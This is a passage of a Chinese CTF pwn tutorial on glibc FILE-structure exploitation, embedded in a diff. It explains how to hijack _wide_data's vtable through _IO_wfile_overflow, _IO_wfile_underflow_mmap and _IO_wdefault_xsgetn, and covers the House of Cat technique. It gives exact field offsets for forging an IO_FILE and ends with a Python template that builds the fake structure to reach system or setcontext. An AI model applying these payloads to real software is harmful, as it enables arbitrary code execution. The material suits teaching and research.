_wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里并<strong>没有对vtable的合法性进行检测</strong>。因此，我们可以劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流。</p>
+<p>利用思路：</p>
+<p>目前在<code>glibc</code>源码中搜索到的<code>_IO_WXXXXX</code>系列函数的调用只有<code>_IO_WSETBUF</code>、<code>_IO_WUNDERFLOW</code>、<code>_IO_WDOALLOCATE</code>和<code>_IO_WOVERFLOW</code>。其中<code>_IO_WSETBUF</code>和<code>_IO_WUNDERFLOW</code>目前无法利用或利用困难，其余的均可构造合适的<code>_IO_FILE</code>进行利用。</p>
+<p>（1）利用<code>_IO_wfile_overflow</code>控制程序执行流（走<code>_IO_WDOALLOCATE</code>）</p>
+<p>以下利用的前提是要从<code>_IO_flush_all_lockp</code>执行<code>_IO_overflow(fp)</code>，因此伪造的IO_FILE需要满足以下条件：</p>
+<ol>
+<li><code>fp-&gt;_mode&lt;=0</code></li>
+<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
+</ol>
+<p>调用链如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
+
+<p>在<code>_IO_wfile_overflow</code>中需要绕过一些检测，使其成功调用<code>_IO_wdoallocbuf</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span> _IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wdoallocbuf (f);<span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要满足<code>_flags &amp; _IO_NO_WRITES==0</code>，<code>_flags &amp; _IO_CURRENTLY_PUTTING==0</code>和<code>_wide_data-&gt;_IO_write_base == 0</code>。</p>
+<p>在<code>_IO_wdoallocbuf</code>函数中需要使其调用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="comment">// _IO_WXXXX调用，需要走到这里</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">             fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure>
+
+<p>需要满足<code>_wide_data-&gt;_IO_buf_base==0</code>和<code>_flags &amp; _IO_UNBUFFERED==0</code>。</p>
+<p>综上需要对伪造的IO_FILE进行一下设置：</p>
+<ul>
+<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>  sh;</code>，注意前面有两个空格</li>
+<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
+<li><code>fp-&gt;_mode&lt;=0</code></li>
+<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
+<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
+<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
+<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
+<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
+</ul>
+<p>（2）利用<code>_IO_wfile_underflow_mmap</code>控制程序执行流（走<code>_IO_WDOALLOCATE</code>）</p>
+<p>调用链如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
+
+<p>在<code>_IO_wfile_underflow_mmap</code>中需要绕过一些检测，使其成功调用<code>_IO_wdoallocbuf</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span> _IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要满足<code>_flags &amp; _IO_NO_READS == 0</code>，<code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>和<code>_IO_read_ptr &lt; _IO_read_end</code>绕过前面的return。设置<code>_wide_data-&gt;_IO_buf_base == NULL</code>和<code>_wide_data-&gt;_IO_save_base == NULL</code>调用<code>_IO_wdoallocbuf (fp)</code>。</p>
+<p>综上需要对伪造的IO_FILE进行一下设置：</p>
+<ul>
+<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li>
+<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
+<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
+<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
+<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
+<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
+<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
+<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
+</ul>
+<p>（3）利用<code>_IO_wdefault_xsgetn</code>控制程序执行流（走<code>_IO_WOVERFLOW</code>）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>
+
+<p>在<code>_IO_wdefault_xsgetn</code>中需要绕过一些检测，使其成功调用<code>__wunderflow</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> _IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">          <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">          <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">        *s++ = *p++;</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF) <span class="comment">//进入这里</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure>
+
+<p>需要满足<code>_wide_data-&gt;_IO_read_end - _wide_data-&gt;_IO_read_ptr== 0</code>不进入第一个if。之后需要<code>mode!=0</code>调用<code>__wunderflow(fp)</code>。</p>
+<p>之后要进入<code>_IO_switch_to_wget_mode</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span> __wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF) <span class="comment">//进入这里</span></span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要满足<code>mode&gt;0</code>（前面已经让mode!=0）绕过第一个if。之后需要<code>_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>，调用<code>_IO_switch_to_wget_mode</code>。</p>
+<p>最后真正进入<code>_IO_WXXXX</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要满足<code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>调用<code>_IO_WOVERFLOW</code>。</p>
+<p>综上需要对伪造的IO_FILE进行一下设置：</p>
+<ul>
+<li><code>_flags</code>设置为<code>0x800</code></li>
+<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>
+<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
+<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
+<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
+<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
+<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
+</ul>
+<h3 id="House-of-Cat"><a href="#House-of-Cat" class="headerlink" title="House of Cat"></a>House of Cat</h3><p>House of Cat利用了**_IO_wfile_jumps<strong>中的</strong>_IO_wfile_seekoff<strong>函数，最后</strong>_IO_switch_to_wget_mode<strong>函数中来攻击，在</strong>FSOP<strong>的情况下也是可行的，只需修改虚表指针的偏移来调用</strong>_IO_wfile_seekoff<strong>即可（通常是结合</strong>__malloc_assert<strong>，改vtable为</strong>_IO_wfile_jumps+0x10**）。</p>
+<p>调用链：<code>_IO_wfile_seekoff -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW</code></p>
+<p><code>_IO_wfile_seekoff</code>如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span> _IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp)) <span class="comment">//进入_IO_switch_to_wget_mode</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>_IO_switch_to_wget_mode</code>如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果要利用<code>_IO_WOVERFLOW</code>，我们将其设置为<code>system</code>或者<code>one_gadget</code>，调用到这里就可以<code>get shell</code>。不过如果遇到了<strong>开启沙箱</strong>的情况，这种方法就不可行了，我们就要考虑其他方式。</p>
+<p>先看看<code>_IO_switch_to_wget_mode</code>调用<code>_IO_WOVERFLOW</code>的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0] </span><br><span class="line">;rdi==fp</span><br><span class="line">;rax=fp+0xa0==wide_data</span><br><span class="line">0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">;rdx=wide_data-&gt;_IO_write_ptr</span><br><span class="line">0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0] ;rax=wide_data+0xe0==wide_data-&gt;vtable</span><br><span class="line">0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18] </span><br><span class="line">;call wide_data-&gt;vtable+0x18==_IO_WOVERFLOW</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这个过程通过将<code>fp</code>传入寄存器<code>rdi</code>，并通过对寄存器<code>rdi</code>进行操作，从中取出<code>wide_data中的_IO_write_ptr</code>和<code>wide_data中的vtable</code>，最后调用<code>vtable中的_IO_WOVERFLOW</code>。</p>
+<p>可以看到<code>wide_data中的_IO_write_ptr</code>被放入<code>rdx</code>，<code>wide_data中的vtable</code>被放入<code>rax</code>，通过<code>call   qword ptr [rax + 0x18]</code>调用<code>_IO_WOVERFLOW</code>，而这个<code>vtable</code>也是通过<code>rdi</code>的偏移再间址访问再偏移取得的。由于<code>IO_FILE</code>结构已经被我们劫持，因此寄存器<code>rdi</code>中的值是我们伪造的<code>IO_FILE</code>，是可以被我们所控制的，因此<code>rdx</code>和<code>rax</code>都是可以被我们控制的，所以**除了可以控制<code>rax</code>为伪造的<code>_IO_WOVERFLOW</code>之外，我们还可以控制寄存器<code>rdx</code>**。</p>
+<p>这样我们就可以<strong>利用<code>setcontext</code>来控制程序流程</strong>了，后面无论是走<code>ROP的orw</code>还是走<code>shellcode的orw</code>都可以得到flag了。</p>
+<p><code>House of Cat</code>的模板如下：（具体情况还需要调试修改）</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=伪造rdx的值 </span></span><br><span class="line">fake_IO_FILE +=p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10 or ...</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr,wide_data-&gt;vtable</span></span><br></pre></td></tr></table></figure>
+
